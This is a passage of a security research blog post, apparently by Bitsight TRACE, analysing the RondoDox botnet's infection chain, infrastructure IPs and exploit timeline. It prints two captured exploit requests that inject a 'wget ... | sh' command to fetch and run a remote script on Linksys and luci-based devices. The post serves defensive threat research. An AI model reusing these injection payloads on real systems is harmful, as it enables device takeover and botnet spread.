+    d="M23.75 3.75C24.413 3.75 25.0489 4.01339 25.5178 4.48223C25.9866 4.95107 26.25 5.58696 26.25 6.25V23.75C26.25 24.413 25.9866 25.0489 25.5178 25.5178C25.0489 25.9866 24.413 26.25 23.75 26.25H6.25C5.58696 26.25 4.95107 25.9866 4.48223 25.5178C4.01339 25.0489 3.75 24.413 3.75 23.75V6.25C3.75 5.58696 4.01339 4.95107 4.48223 4.48223C4.95107 4.01339 5.58696 3.75 6.25 3.75H23.75ZM23.125 23.125V16.5C23.125 15.4192 22.6957 14.3828 21.9315 13.6185C21.1672 12.8543 20.1308 12.425 19.05 12.425C17.9875 12.425 16.75 13.075 16.15 14.05V12.6625H12.6625V23.125H16.15V16.9625C16.15 16 16.925 15.2125 17.8875 15.2125C18.3516 15.2125 18.7967 15.3969 19.1249 15.7251C19.4531 16.0533 19.6375 16.4984 19.6375 16.9625V23.125H23.125ZM8.6 10.7C9.15695 10.7 9.6911 10.4788 10.0849 10.0849C10.4788 9.6911 10.7 9.15695 10.7 8.6C10.7 7.4375 9.7625 6.4875 8.6 6.4875C8.03973 6.4875 7.50241 6.71007 7.10624 7.10624C6.71007 7.50241 6.4875 8.03973 6.4875 8.6C6.4875 9.7625 7.4375 10.7 8.6 10.7ZM10.3375 23.125V12.6625H6.875V23.125H10.3375Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+      </ul>
+</div>
+  </div>
+
+  <div class="container blog__authors">
+    <address class="node node--type-profile node--view-mode-author-credit author-credit">
+      <figure class="media media--type-image media--view-mode-avatar">
+  
+    <img loading="eager" src="/sites/default/files/styles/avatar/public/2025/06/27/Joao-Godinho-min.jpg?itok=QbPzWWIp" width="57" height="57" alt="João Godinho" />
+
+
+
+</figure>
+
+
+  <div class="author-credit--info">
+    <span class="written-by">Written by</span> <a href="/our-team/joao-godinho">João Godinho </a>
+    
+            <div class="field field--name-field-position field--type-string field--label-hidden field__item">
+                          Principal Research Scientist
+              </div>
+      
+  </div>
+</address>
+
+  </div>
+
+  
+  <div class="container blog__main layout-2x">
+    <div class="node__body jump-menu__content">
+      
+
+
+      <div class="layout layout--onecol">
+      
+      <div  class="layout__region layout__region--content">
+          <div class="block block-layout-builder block-inline-blocktext">
+    
+    
+          
+
+
+  
+
+<div  class="block-content block-content--type-text block-content--40811 block-content--view-mode-full container text-wysiwyg">
+
+  
+  
+
+  
+      <div class="text-wysiwyg__body">
+      
+
+            <div class="body-text clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item">
+                          <p>According to a 2024 report from <a href="https://iot-analytics.com/number-connected-iot-devices/">IoT Analytics</a>, there were 16.6 billion Internet of Things (IoT) connected devices at the end of 2023, and that number is expected to grow to 41.1 billion by 2030. This means an increased attack surface for malicious actors to take advantage of, especially given that the security posture of the vendors that provide these devices varies greatly. Previous research from Bitsight TRACE has exposed security risks stemming from IoT devices, including <a href="https://www.bitsight.com/blog/the-growing-exposure-of-ics-ot-devices">ICS and OT systems</a>, <a href="https://www.bitsight.com/blog/bitsight-identifies-thousands-of-compromised-security-cameras">IoT cameras</a>, and threats like <a href="https://www.bitsight.com/blog/rapperbot-infection-ddos-split-second">RapperBot</a>.</p>
+
+<p>This expanding attack surface extends well beyond IoT devices. Any internet-exposed service introduces risk, and data from Groma Explorer shows more than <a href="https://www.bitsight.com/groma-explorer">900 million exposed services observed over a 30 day period</a>. In this environment, it’s not surprising to see new threats entering the landscape and trying to take advantage of exposed and vulnerable devices.</p>
+
+<p>One threat that has been making noise recently due to its large repertoire of exploits is the RondoDox botnet. We initially observed this threat in May 2025 and started following its behavior when we noticed the high volume of traffic it was generating in our honeypots (Fig. 1).</p>
+
+<p>This post (the first in a two-part series) will look at how RondoDox is scanning and exploiting internet exposed devices and how threat actor methodology has been evolving since it was first observed in May 2025, including the exploits we’ve observed, a timeline of their usage and adoption, and details about their infrastructure and its characteristics.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%201%20Number%20of%20events%20and%20moving%20average%20for%20RondoDox%20exploits%20%20.png" width="850" height="458" alt="Figure 1 Number of events and moving average for RondoDox exploits">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 1. Number of events and moving average for RondoDox exploits</figcaption>
+</figure>
+
+</center>
+
+<h2>Key takeaways</h2>
+
+<ul>
+	<li>Implementation of 174 different exploits, a largely uncommon number for these types of threats.</li>
+	<li>Peaked at 15,000 exploitation attempts in a single day</li>
+	<li>Likely usage of compromised residential IPs as hosting infrastructure</li>
+	<li>Threat actors follow vulnerability disclosure, with exploits being used before CVEs are published</li>
+	<li>Change in exploit methodology from shotgun approach to more targeted and recent vulnerabilities</li>
+	<li>Usage of blacklisting logic to validate access in hosting infrastructure</li>
+</ul>
+
+<h2>Infection chain</h2>
+
+<p>This threat, like many others that came before it, shares a lot of commonalities with Mirai (which is not surprising, given Mirai’s source code is open source). Because of this, it’s common to see this threat being detected as a Mirai variant, and any analysis of the malware’s binaries will give <em>déjà vu</em> vibes. The main differentiator between RondoDox and Mirai is that, unlike Mirai, this malware’s sole purpose is to execute DoS attacks, while Mirai is not only capable of doing DoS attacks but also scan and exploit other systems.</p>
+
+<p>We’ll not go into specific details about the malware and its behavior because that will be shared in the next post, and also because we’ll be presenting the entirety of this research at <a href="https://www.botconf.eu/">BotConf 2026</a>. But nonetheless, to better contextualize the reader, we’ll provide a summary of the infection chain and a short description of the malware.</p>
+
+<p>As the threat actors' infrastructure scans the internet for vulnerable devices, they aim to exploit RCE vulnerabilities that allow them to fetch and execute a shell script. An example of such an exploit can be seen below, which targets an unauthenticated remote code execution in <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-34037">Linksys</a>.</p>
+
+<pre style="background:#f2f2f2; padding:15px; font-size:13px; line-height:1.5; white-space: pre-wrap; overflow-wrap: anywhere; word-break: break-word;">
+<code style="color:green;">POST /tmUnblock.cgi HTTP/1.1
+Host: &lt;REDACTED&gt;:8080
+User-Agent: Mozilla/5.0 (<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="57253839333865676665173623383a3e343a363e3b793e38">[email&#160;protected]</a>)
+Connection: close
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+
+submit_button=&amp;change_action=&amp;action=&amp;commit=0&amp;ttcp_num=2&amp;ttcp_size=2&amp;ttcp_ip=-h `busybox wget -qO- http://&lt;RONDO INFRA&gt;/rondo.jbt.sh|sh`&amp;StartEPI=1
+</code></pre>
+
+<p>The payloads we’ve observed always prevent the initial implant to be written to disk, piping the output of one command into another. This initial implant can be divided into four main steps:</p>
+
+<ol>
+	<li>Hinder detection and analysis</li>
+	<li>Attempt to remove other malware</li>
+	<li>Find a writable directory to drop the main binary</li>
+	<li>Fetch the correct binary for the architecture and run it</li>
+</ol>
+
+<p>Following a successful execution of the shell script, the main binary is spawn with an argument that is used to indicate which vulnerability was exploited and what architecture it’s running on, with the format “&lt;vuln&gt;.&lt;arch&gt;” This works by having the script trying to sequentially download the binary for each architecture until one works. The previous snippet would have the vulnerability set to “linksys” and the architecture would depend on the system; an example of the argument would be <code>linksys.mipsel</code> for this vulnerability in a MIPSel architecture. At the time of writing, they supported 18 architectures: x86_64, i686, i586, i486, armv6l, armv5l, armv4l, armv7l, powerpc, powerpc-440fp, mips, mipsel, arc700, sh4, sparc, m68k, armeb, armbhf.</p>
+
+<p>Upon being launched, the main binary does some basic sanity checks for its name and arguments, as well as checks for anti-debug and anti-analysis. It then attempts to remove other threats, both by checking specific file locations and by removing entries from the victim's crontabs. At this point it will also set up its own persistence and drop and launch the XMRig miner (a feature that we’ll go into more detail in the next post). Finally, the malware will connect to one of the hardcoded C2s and wait for commands. A detailed technical analysis of the binary will be provided in the next post.</p>
+
+<h2>Infrastructure details</h2>
+
+<p>The infrastructure that supports the exploitation, distribution, and management of the botnet is one of the most, if not the most, important pieces of the RondoDox operation, which is why we've dedicated an entire post about it. In this section we’ll dig into some of the infrastructure details we’ve gathered throughout the research.</p>
+
+<p>We’ve identified infrastructure belonging to RondoDox based on the payloads, which include specific indicators of RondoDox’s activity. One of such indicators is the usage of the name “rondo” in the scripts, and another one is the usage of specific email addresses in the User-Agent header, both exemplified below.</p>
+
+<pre style="background:#f2f2f2; padding:15px; font-size:13px; line-height:1.5; white-space: pre-wrap; overflow-wrap: anywhere; word-break: break-word;">
+<code style="color:green;">GET /cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=`wget -qO- 
+http://&lt;RONDO INFRA&gt;/<strong>rondo.zqq.sh</strong>|sh` HTTP/1.1
+User-Agent: Mozilla/5.0 (<strong><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c1a3a0afa6f3f1f0f381b1b3aeb5aeafaca0a8adefa2aeac">[email&#160;protected]</a></strong>)
+Host: &lt;REDACTED&gt;
+Connection: close
+Accept: */*
+</code></pre>
+
+<p>Using the data from our honeypots and the previously shown indicators, we’ve extracted the exploitation and hosting infrastructure for the time period between May 25, 2025 (the first observation of RondoDox activity) and February 16, 2026 (our cutoff date for this research), and plotted the timeline in Fig. 2 below, where IPs in orange represent exploiting infrastructure and IPs in blue represent hosting infrastructure. We identified a total of 32 IP addresses, 16 for each type of infrastructure.</p>
+
+<p>We’ve used the previously mentioned indicators to extract the activity, but it’s worth noting that we saw activity from the exploiting IPs that do not appear to be related to RondoDox, and consequently was not mapped in this timeline.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%202%20Timeline%20of%20IP%20usage.png" width="850" height="523" alt="Figure 2 Timeline of IP usage">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 2. Timeline of IP usage</figcaption>
+</figure>
+
+</center>
+
+<p>We can note multiple things from the timeline: there are interruptions in the activity throughout the monitored period, which are not always related to a change in infrastructure; there’s no 1:1 mapping of exploiting and hosting infrastructure, meaning that the same hosting IP is used in multiple exploiting IPs; and furthermore we can also see that only one hosting IP is used at a time, while the same does not always happen for exploiting IPs, as we can see in late July 2025 and mid October 2025.</p>
+
+<p>One very relevant note is that we’ve mentioned that the first observation of exploitation is from May 25, 2025, but the bars are not visible in the timeline. This is because those first exploitation attempts lasted 12 minutes and then stopped until June 4, 2025. The reason it stopped was because the payloads being sent were invalid, which the operators likely noticed and stopped exploiting until they were able to fix the issue.</p>
+
+<p>If we look at the autonomous systems for both the exploiting and hosting infrastructure, an interesting pattern emerges. The table below shows the IPs used as exploitation infrastructure, where we can see that all of them belong to hosting providers and all accept crypto as payment. One of these providers is particularly interesting: 1337 Services GmbH, which is known as <a href="https://krebsonsecurity.com/2025/02/whos-behind-the-seized-forums-cracked-nulled/">StarkRDP and rdp[.]sh</a> and potentially x1337[.]cc.</p>
+
+<center>
+<table style="width:100%;">
+	<tbody>
+		<tr>
+			<th>IP</th>
+			<th>ASN</th>
+			<th>Company</th>
+			<th>Country</th>
+		</tr>
+		<tr>
+			<td>45.135.194[.]34</td>
+			<td>AS51396</td>
+			<td>Pfcloud UG</td>
+			<td>Germany</td>
+		</tr>
+		<tr>
+			<td>45.135.194[.]11</td>
+			<td>AS51396</td>
+			<td>Pfcloud UG</td>
+			<td>Germany</td>
+		</tr>
+		<tr>
+			<td>87.121.84[.]31</td>
+			<td>AS215925</td>
+			<td>VPSVAULT.HOST LTD</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>87.121.84[.]132</td>
+			<td>AS215925</td>
+			<td>VPSVAULT.HOST LTD</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>87.121.84[.]75</td>
+			<td>AS215925</td>
+			<td>VPSVAULT.HOST LTD</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>45.156.87[.]165</td>
+			<td>AS51396</td>
+			<td>Pfcloud UG</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>192.253.248[.]5</td>
+			<td>AS213790</td>
+			<td>Secure Internet LLC</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>45.88.186[.]32</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>45.88.186[.]85</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>45.153.34[.]156</td>
+			<td>AS51396</td>
+			<td>Pfcloud UG</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>124.198.131[.]83</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>45.135.194[.]32</td>
+			<td>AS51396</td>
+			<td>Pfcloud UG</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>193.26.115[.]195</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>192.159.99[.]95</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>45.94.31[.]201</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>Netherlands</td>
+		</tr>
+		<tr>
+			<td>193.26.115[.]178</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+			<td>United States</td>
+		</tr>
+	</tbody>
+</table>
+</center>
+
+<p>If we now compare with the hosting infrastructure, shown in the table below, we can see the majority of the IPs belong to ISPs, with the exception of AS207713, AS17561, AS210558, AS209847 and AS202468, highlighted in bold. We don’t publish these ISPs to denigrate them, as it’s likely that it’s their customers who are falling victim to the botnet and are unknowingly providing the infrastructure for RondoDox, but rather to point out this particular strategy by the threat actors.</p>
+
+<center>
+<table style="width:100%;">
+	<tbody>
+		<tr>
+			<th>IP</th>
+			<th>ASN</th>
+			<th>Company</th>
+			<th>Country</th>
+		</tr>
+		<tr>
+			<td>14.103.145[.]202</td>
+			<td>AS4811</td>
+			<td>Beijing Volcano Engine Technology Co., Ltd.</td>
+			<td>China</td>
+		</tr>
+		<tr>
+			<td><strong>78.153.149[.]90</strong></td>
+			<td><strong>AS207713</strong></td>
+			<td><strong>GLOBAL INTERNET SOLUTIONS LLC</strong></td>
+			<td><strong>Russia</strong></td>
+		</tr>
+		<tr>
+			<td><strong>154.91.254[.]95</strong></td>
+			<td><strong>AS17561</strong></td>
+			<td><strong>Cloud Innovation Ltd</strong></td>
+			<td><strong>Brazil</strong></td>
+		</tr>
+		<tr>
+			<td>14.103.145[.]211</td>
+			<td>AS4811</td>
+			<td>Beijing Volcano Engine Technology Co., Ltd.</td>
+			<td>China</td>
+		</tr>
+		<tr>
+			<td><strong>45.8.145[.]203</strong></td>
+			<td><strong>AS209847</strong></td>
+			<td><strong>WorkTitans B.V.</strong></td>
+			<td><strong>Netherlands</strong></td>
+		</tr>
+		<tr>
+			<td><strong>37.32.15[.]8</strong></td>
+			<td><strong>AS202468</strong></td>
+			<td><strong>AbrArvan IaaS</strong></td>
+			<td><strong>Iran</strong></td>
+		</tr>
+		<tr>
+			<td>169.255.72[.]169</td>
+			<td>AS327829</td>
+			<td>SKYTIC TELECOM</td>
+			<td>Republic of the Congo</td>
+		</tr>
+		<tr>
+			<td>38.59.219[.]27</td>
+			<td>AS4226</td>
+			<td>Sumofiber</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>192.183.232[.]142</td>
+			<td>AS5650</td>
+			<td>Frontier Communications of America, Inc.</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>83.252.42[.]112</td>
+			<td>AS1257</td>
+			<td>Tele2 Sverige AB</td>
+			<td>Sweden</td>
+		</tr>
+		<tr>
+			<td>99.241.94[.]234</td>
+			<td>AS812</td>
+			<td>Rogers Communications Canada Inc.</td>
+			<td>Canada</td>
+		</tr>
+		<tr>
+			<td>74.194.191[.]52</td>
+			<td>AS19108</td>
+			<td>Optimum</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>70.184.13[.]47</td>
+			<td>AS22773</td>
+			<td>Cox Communications Inc.</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>23.228.188[.]126</td>
+			<td>AS16591</td>
+			<td>Google Fiber Inc.</td>
+			<td>United States</td>
+		</tr>
+		<tr>
+			<td>41.231.37[.]153</td>
+			<td>AS2609</td>
+			<td>ATI - Agence Tunisienne Internet</td>
+			<td>Tunisia</td>
+		</tr>
+		<tr>
+			<td><strong>45.92.1[.]50</strong></td>
+			<td><strong>AS210558</strong></td>
+			<td><strong>1337 Services GmbH</strong></td>
+			<td><strong>Netherlands</strong></td>
+		</tr>
+	</tbody>
+</table>
+</center>
+
+<p>We started monitoring the hosting infrastructure more closely in October 2025, and we noticed that an IP was exposing a UniFi Protect interface. But the interface was not always available; we would either be able to reach the interface or RondoDox’s hosting server. We found this behavior rather suspicious and started questioning if this system was compromised by RondoDox’s operators.</p>
+
+<p>To try and find some validation to this theory, we used Bitsight’s <a href="https://www.bitsight.com/groma-explorer">Groma</a> dataset to check exposed services on the residential IPs. Out of 11 residential IPs, four of them were at some point exposing services which we suspect could be compromised: two IPs had a Control4 interface exposed, one had a TCL Android TV webserver exposed, and the one we previously mentioned had the UniFi Protect interface exposed.</p>
+
+<p>Although we could not confirm our suspicions, the usage of residential IPs that were exposing services that are susceptible of being compromised, together with the specific behaviour we’ve observed in October 2025, make us believe these are likely compromised systems.</p>
+
+<p>During our investigation of the hosting infrastructure, we also noticed that their usage of a blacklisting capability makes getting the initial implant and malware harder. When an IP is blacklisted the webserver returns a <a href="https://www.virustotal.com/gui/file/315024e7c9ad9d11eddb702e264a94835479c37e8a6a250c32488b04fa7ee8f9">webpage</a> that plays a video in the background and shows an email and a “Download” button (Fig. 3 below). When clicked the button simply unmutes the video.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%203%20Page%20returned%20when%20IP%20is%20blacklisted.png" width="850" height="406" alt="Figure 3 Page returned when IP is blacklisted">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 3. Page returned when IP is blacklisted</figcaption>
+</figure>
+
+</center>
+
+<p>To close the infrastructure section we’ll look at the final piece: the C2 IPs used to control the bots. In Fig. 4 below we’ve plotted the timeline of the IPs we observed during the research period. These IPs were extracted from the malware samples, and unlike the previous infrastructure where we could see IP activity directly in our honeypots, for the C2s we had to obtain samples and then extract the IPs. Because of this the dates where the infrastructure changes might not correspond exactly to when the operators changed it.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%204%20Timeline%20of%20C2%20IP%20usage.png" width="850" height="354" alt="Figure 4. Timeline of C2 IP usage.">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 4. Timeline of C2 IP usage.</figcaption>
+</figure>
+
+</center>
+
+<p>The first obvious note is that we’ve only observed four different IPs being used as C2, which is not surprising given that these IPs are used exclusively by the infected machines. Additionally, because they’re encrypted in the samples, it requires a more active analysis to obtain. We can easily confirm that these IPs are not considered suspicious by looking at the <a href="https://www.virustotal.com/gui/search/135%252E148%252E68%252E54%250A83%252E150%252E218%252E93%250A45%252E94%252E31%252E89%250A45%252E125%252E66%252E100?type=ips">VT</a> detections that show no single IP has over nine detections.</p>
+
+<p>One other relevant note about this timeline is that the first sample we’ve observed belonging to RondoDox is from <a href="https://www.virustotal.com/gui/file/b6ac25d41c7a6d85ffe7c273a2dfcd4502d3246a2e91543d342a015c153d9b5e/">early May 2025</a>, which contrasts with our first observations in the honeypots that are from late May 2025.</p>
+
+<p>Below we’ve included a table with the IPs and the corresponding ASN and Company, which we can see belong to hosting providers.</p>
+
+<center>
+<table>
+	<tbody>
+		<tr>
+			<th>IP</th>
+			<th>ASN</th>
+			<th>Company</th>
+		</tr>
+		<tr>
+			<td>135.148.68[.]54</td>
+			<td>AS16276</td>
+			<td>OVH SAS</td>
+		</tr>
+		<tr>
+			<td>83.150.218[.]93</td>
+			<td>AS199415</td>
+			<td>Association YORKHOST</td>
+		</tr>
+		<tr>
+			<td>45.94.31[.]89</td>
+			<td>AS210558</td>
+			<td>1337 Services GmbH</td>
+		</tr>
+		<tr>
+			<td>45.125.66[.]100</td>
+			<td>AS133398</td>
+			<td>Serveroffer</td>
+		</tr>
+	</tbody>
+</table>
+</center>
+
+<h2>Threat evolution</h2>
+
+<p>To better understand the evolution of this threat we mapped our honeypot observations into vulnerabilities based on the exploits we were receiving. Where possible we tried to map the exploit to specific CVEs, but in some cases we were not able to identify the exploit, and in some other cases there was no assigned CVE that we could map.</p>
+
+<p>The operators of RondoDox have been using a shotgun approach, where they send multiple exploits to the same endpoint, hoping for one to work. In Fig. 5 below we can see an example of this, where the same source sends different exploits to the same target, all targeting very different vulnerabilities.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%205%20Example%20of%20the%20shotgun%20approach%20used%20by%20RondoDox.png" width="850" height="398" alt="Figure 5 Example of the shotgun approach used by RondoDox">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 5. Example of the shotgun approach used by RondoDox</figcaption>
+</figure>
+
+</center>
+
+<p>We gathered all these exploit attempts (identifiable by indicators like the User-Agent and script name previously mentioned) and identified 174 different vulnerabilities between May 25, 2025 and February 16, 2026. From these vulnerabilities we were able to map 148 CVEs, 15 with a public PoC but no CVE, and 11 where we were not able to find any public PoC. In our GitHub (linked at the end of this post) we provide a list with all the CVEs and the exploits used.</p>
+
+<p>To better understand how these vulnerabilities were used throughout time, we plotted a timeline of when each vulnerability was seen being used (Fig. 6). We can note how the number of vulnerabilities fluctuates, indicating that they add and remove vulnerabilities instead of solely adding new vulnerabilities. It’s also important to note that since the beginning of 2026 the number of used vulnerabilities decreased significantly, showing the threat actors are likely focusing on specific vulnerabilities that can potentially lead to more infections.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%206%20Unique%20daily%20vulnerabilities%20observed.png" width="850" height="458" alt="Figure 6 Unique daily vulnerabilities observed">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 6. Unique daily vulnerabilities</figcaption>
+</figure>
+
+</center>
+
+<p>We can note the evolution of the threat in terms of used vulnerabilities, where initially the number of used vulnerabilities was low, after which it started increasing up to a maximum of 49 used vulnerabilities in a single day (October 19, 2025). It then stabilized around 40 vulnerabilities and then finally, as previously stated, hit a big cut-off in the beginning of 2026.</p>
+
+<p>When examining how often each vulnerability was used, a clear long-tail trend emerges. While the average vulnerability was used for 18 days, nearly half of the 174 vulnerabilities identified (84, or 48%) were exploited for just a single day. This suggests that they try vulnerabilities and act based on the success rate of each.</p>
+
+<p>In Fig. 7 below we plotted a timeline for vulnerabilities that were used more than 5 days during our observation period. This timeline provides insights into how vulnerabilities are added and used. We can see that initially (June to mid July of 2025) the threat actors tried different vulnerabilities, but only around the end of July 2025 were they all enabled, albeit for a short period of time. This pattern repeats in mid August 2025 and then again in the beginning of September 2025, when we see multiple vulnerabilities being used for an extended period of time. This implementation of new vulnerabilities appears to change around the end of October and beginning of November 2025, where new vulnerabilities are introduced and just kept running.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%207%20Timeline%20of%20vulnerability%20usage.png" width="850" height="654" alt="Figure 7 Timeline of vulnerability usage">
+
+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 7. Timeline of vulnerability usage</figcaption>
+</figure>
+
+</center>
+
+<p>The most radical change in our observations is in early January 2026, where we went from around 40 observed vulnerabilities down to only two. One of these vulnerabilities is <a href="https://nvd.nist.gov/vuln/detail/cve-2023-46604">CVE-2023-46604</a>, which is not very interesting in itself, but the other one is <a href="https://nvd.nist.gov/vuln/detail/cve-2025-55182">CVE-2025-55182</a>, aka <a href="https://www.bitsight.com/blog/cve-2025-55182-analysis-of-react2shell-exploitations">React2Shell</a>, which was disclosed on December 3, 2025 and added by the threat actors on December 6, 2025.</p>
+
+<p>The fast addition of recently disclosed vulnerabilities is something that caught our attention, and by looking at some recent CVEs from 2025 we created the following table, showing the time between the vulnerability being disclosed and when it was added by the operators.</p>
+
+<center>
+<table style="width:100%;">
+	<tbody>
+		<tr>
+			<th>CVE</th>
+			<th>MITRE Published</th>
+			<th>First Observed Date</th>
+		</tr>
+		<tr>
+			<td>CVE-2025-47812</td>
+			<td>2025-07-10</td>
+			<td>2025-07-15</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-24016</td>
+			<td>2025-02-10</td>
+			<td>2025-08-22</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-32756</td>
+			<td>2025-05-13</td>
+			<td>2025-10-18</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-20281</td>
+			<td>2025-06-25</td>
+			<td>2025-10-18</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-52089</td>
+			<td>2025-07-11</td>
+			<td>2025-10-19</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-57296</td>
+			<td>2025-09-19</td>
+			<td>2025-10-19</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-24893</td>
+			<td>2025-02-20</td>
+			<td>2025-11-03</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-48827</td>
+			<td>2025-05-27</td>
+			<td>2025-11-03</td>
+		</tr>
+		<tr>
+			<td><strong>CVE-2025-62593</strong></td>
+			<td><strong>2025-11-26</strong></td>
+			<td><strong>2025-11-24</strong></td>
+		</tr>
+		<tr>
+			<td>CVE-2025-55182</td>
+			<td>2025-12-03</td>
+			<td>2025-12-06</td>
+		</tr>
+		<tr>
+			<td>CVE-2025-37164</td>
+			<td>2025-07-10</td>
+			<td>2026-01-07</td>
+		</tr>
+	</tbody>
+</table>
+</center>
+
+<p>We can see how in most cases the operators trail the CVE disclosure date by multiple weeks, with the exception of CVE-2025-62593. This was exploited before the CVE was published, and this is justified because the PoC for the vulnerability was available before the published date, indicating that the operators are actively looking at publications related to vulnerabilities and not just following CVE disclosure.</p>
+
+<p>This seems quite interesting and shows motivation by the threat actors, but at the same time, based on our observations, some of the exploits are not being used correctly. We first noticed this issue on the first exploit ever (which as previously mentioned lasted 12 minutes), where the payload was being sent as a JSON instead of form encoded.</p>
+
+<p>Other examples of issues with exploits are in CVE-2025-47812 and CVE-2025-62593. In the first CVE, if we read the <a href="https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/">description</a> by RCE Security we can see that in order to fully trigger the exploit it requires 2 requests: an initial POST with the payload, followed by a POST to trigger the exploit. In our honeypots we only see the first POST and not the second, which we’re not sure it relates to how our honeypots are responding and not triggering the second request, or if the operators wrongly implemented the exploit.</p>
+
+<p>For CVE-2025-62593 there’s a similar issue in the implemented exploit. The <a href="https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v">advisory</a> mentions that the authentication to critical endpoints is made by checking the User-Agent string for “Mozilla", which if present will return an HTTP code 405. The exploit used by RondoDox specifically sets the User-Agent to “Mozilla/5.0 (rondo2012@atomicmail[.]io)” which will render the exploit ineffective.</p>
+
+<p>Following our observations, we suspect the threat actors might be adjusting their methodology regarding the addition of new exploits, and instead of using a large number of vulnerabilities, just focus on more recent disclosed vulnerabilities. At the same time we find it confusing that they have the motivation to stay up-to-date on new vulnerabilities, but appear to have issues implementing the vulnerabilities.</p>
+
+<h2>Addressing unsustained claims</h2>
+
+<p>While researching previous work related to the RondoDox botnet, we came across some claims we were not able to validate but deserve some attention to avoid misleading researchers and incident responders.</p>
+
+<h3>The “Loader-as-a-Service” claim</h3>
+
+<p>We saw a claim of the existence of a <a href="https://www.cloudsek.com/blog/botnet-loader-as-a-service-infrastructure-distributing-rondodox-and-mirai-payloads">Loader-as-a-Service Infrastructure</a> being used to distribute multiple payloads, including RondoDox. This claim was made based on the content of an exposed HTML page that showed multiple payloads, including RondoDox’s, and the assertion made is that these were logs of a backend panel used by threat actors.</p>
+
+<p>When we encountered this information we were highly interested in the info it could provide and promptly searched Bitsight’s <a href="https://www.bitsight.com/groma-explorer">Groma</a> dataset to find what was being displayed in that page. We found two IPs serving the alleged panel: the first (104.248.75[.]228) was already shared and we observed the exposed page from April to July; the second IP (which we won’t disclose for privacy reasons) was seen in late November with the same format, exemplified below in Fig. 8.</p>
+
+<p>The content of the page repeats itself with the same format, always with the string “POST Data: Array”, followed by a timestamp and then multiple key-value pairs.</p>
+
+<center>
+<figure role="group" class="align-center">
+<article class="media media--type-image media--view-mode-original">
+  
+      
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/2026/03/09/Figure%208%20Example%20of%20an%20array%20dump%20from%20an%20exposed%20page.png" width="850" height="586" alt="Figure 8 Example of an array dump from an exposed page">
+
